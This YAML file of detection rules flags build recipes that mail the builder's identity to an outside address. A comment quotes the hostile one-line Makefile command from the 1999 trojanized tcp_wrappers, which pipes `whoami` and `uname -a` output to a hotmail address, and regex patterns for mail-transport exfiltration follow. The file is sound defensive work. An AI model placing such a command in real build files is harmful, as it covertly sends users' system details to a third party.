# A build recipe that mails the builder's identity to an outside address.
#
# The trojanized tcp_wrappers 7.6 (1999) added one line to its Makefile:
#
#   @sh -c 'echo debug-`whoami`-`uname -a` |mail -s debug wtcpd@hotmail.com'
#
# Running `make` therefore told the operator who had just built the package
# and on what kind of machine -- a target list assembled from the victims'
# own build hosts, arriving as ordinary mail from inside the network, with no
# listening port and no outbound HTTP for anyone to notice.
#
# The shape is what to key on: host-identity commands captured in a command
# substitution and piped to a mail transport, inside a build file. A variant
# that swaps `mail` for `sendmail`, `whoami` for `id`, or hotmail for any
# other address trips the same pair.
defaults:
  platforms: [unix]
  for: [makefile, shell, text]
  attack: T1082,T1195.002
  mbc: B0024

traits:
  - id: pipes-to-mail-transport
    desc: Pipes output into a mail transport
    crit: notable
    conf: 0.92
    if:
      type: text
      regex: '\|\s*(/usr/(s?bin|lib)/)?(mail|mailx|sendmail)\s+[-\w@.]'

composite_rules:
  - id: build-mails-host-identity
    desc: Build recipe mails the builder's identity
    crit: hostile
    conf: 0.96
    near_lines: 2
    all:
      - id: pipes-to-mail-transport
    any:
      - id: micro-behaviors/process/user/query::identity-command-substitution
      - id: micro-behaviors/os/sysinfo/process::sh-whoami-command
      - id: micro-behaviors/os/sysinfo/hostname::sh-hostname-command
      - id: micro-behaviors/os/sysinfo/platform/arch::sh-uname-fingerprint
    unless:
      - id: metadata/package/testing/
